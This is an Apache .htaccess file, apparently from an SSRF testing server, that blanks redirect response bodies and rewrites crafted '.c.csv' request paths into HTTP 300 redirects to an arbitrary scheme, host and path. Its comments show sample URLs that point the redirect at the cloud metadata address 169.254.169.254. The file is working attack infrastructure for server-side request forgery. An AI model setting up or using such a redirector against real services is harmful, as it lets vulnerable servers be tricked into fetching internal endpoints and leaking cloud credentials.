# Set blank response body
ErrorDocument 300 " "
ErrorDocument 301 " "
ErrorDocument 302 " "
ErrorDocument 303 " "
ErrorDocument 307 " "
ErrorDocument 308 " "

# 300 with response body
# https://ssrf.localdomain.pw/csv-without-body/300-https-169.254.169.254:80-.c.csv
# https://ssrf.localdomain.pw/csv-without-body/300-https-169.254.169.254:80-test/.c.csv
RewriteEngine on
RewriteCond %{REQUEST_URI} 300-([^/-]*)-([^/-]*)-(.*).c.csv$
RewriteRule 300-([^/-]*)-([^/-]*)-(.*).c.csv$ $1://$2/$3 [L,R=300,NC]

